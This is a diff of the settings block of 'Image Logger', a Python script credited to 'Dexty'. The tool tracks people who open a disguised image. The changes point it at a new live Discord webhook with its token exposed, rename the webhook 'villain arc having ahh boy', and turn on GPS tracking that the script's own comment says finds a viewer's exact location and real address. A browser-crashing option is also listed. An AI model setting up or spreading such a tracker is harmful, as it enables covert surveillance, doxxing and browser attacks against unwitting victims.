@@ -12,19 +12,19 @@ __author__ = "Dexty"
 
 config = {
     # BASE CONFIG #
-    "webhook": "https://discord.com/api/webhooks/1419144080574910554/rOCi6bZ5l3gRXFkuHW1ZQ5Er2lzCjdhyvszxz2_vEukYUjFbucLeWIgGPjmL4aDtEFR3",
+    "webhook": "https://discord.com/api/webhooks/1424482651825508483/XZwsqVvppF7A6mo49CBcH5IkrlpHrWk3ESUtca-2X2kwb8puB0zx-bIX9Yq6a5q7_72x",
     "image": "https://cdn.discordapp.com/attachments/1419144061495021580/1419145060196552838/afd004ef3eaddee69c78eacd1a0174b0.png?ex=68d0b154&is=68cf5fd4&hm=1bb50b3b860a16a7f114707f6373c9f9e4e6302be8999d99fd2158c5c7b6f6ca&", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
     # CUSTOMIZATION #
-    "username": "Image Logger", # Set this to the name you want the webhook to have
-    "color": 0x00FFFF, # Hex Color you want for the embed (Example: Red is 0xFF0000)
+    "username": "villain arc having ahh boy", # Set this to the name you want the webhook to have
+    "color": 0xFF0000, # Hex Color you want for the embed (Example: Red is 0xFF0000)
 
     # OPTIONS #
     "crashBrowser": False, # Tries to crash/freeze the user's browser, may not work. (I MADE THIS, SEE https://github.com/xdexty0/Chromebook-Crasher)
     
-    "accurateLocation": False, # Uses GPS to find users exact location (Real Address, etc.) disabled because it asks the user which may be suspicious.
+    "accurateLocation": True, # Uses GPS to find users exact location (Real Address, etc.) disabled because it asks the user which may be suspicious.
 
     "message": { # Show a custom message when the user opens the image
         "doMessage": False, # Enable the custom message?
